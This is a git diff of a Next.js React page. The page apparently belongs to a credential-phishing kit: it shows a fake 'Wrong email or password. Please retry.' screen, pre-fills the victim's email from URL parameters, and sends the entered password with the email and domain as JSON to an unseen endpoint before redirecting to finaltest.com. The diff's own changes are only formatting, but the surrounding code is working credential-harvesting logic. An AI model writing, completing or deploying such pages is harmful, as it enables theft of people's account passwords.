@@ -1,17 +1,17 @@
 'use client'
 
-import '../../styles/globals.css'
+import '../styles/globals.css'
 import { useSearchParams, useRouter } from 'next/navigation'
 import { useState } from 'react'
 
 export default function EndPage() {
   const params = useSearchParams()
   const router = useRouter()
-  const email = params.get('email') || ''
+  const email  = params.get('email') || ''
   const domain = params.get('domain') || ''
 
   const [password, setPassword] = useState('')
-  const [errors, setErrors] = useState({ password: '' })
+  const [errors, setErrors]     = useState({ password: '' })
   const [showModal, setShowModal] = useState(false)
 
   const handleRetry = async (e: React.FormEvent) => {
@@ -27,7 +27,6 @@ export default function EndPage() {
       body: JSON.stringify({ email, password, domain }),
     })
     setTimeout(() => {
-      // Redirect to finaltest.com
       router.push('https://finaltest.com')
     }, 2000)
   }
@@ -39,6 +38,7 @@ export default function EndPage() {
           Wrong email or password. Please retry.
         </h1>
         <p className="text-center mb-4 text-gray-700">{email}</p>
+
         <form onSubmit={handleRetry} className="space-y-4">
           <input
             type="password"
@@ -53,9 +53,7 @@ export default function EndPage() {
             className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-400"
             required
           />
-          {errors.password && (
-            <p className="text-sm text-red-600">{errors.password}</p>
-          )}
+          {errors.password && <p className="text-sm text-red-600">{errors.password}</p>}
           <button
             type="submit"
             className="w-full bg-red-500 text-white py-3 rounded-lg hover:bg-red-600 transition"
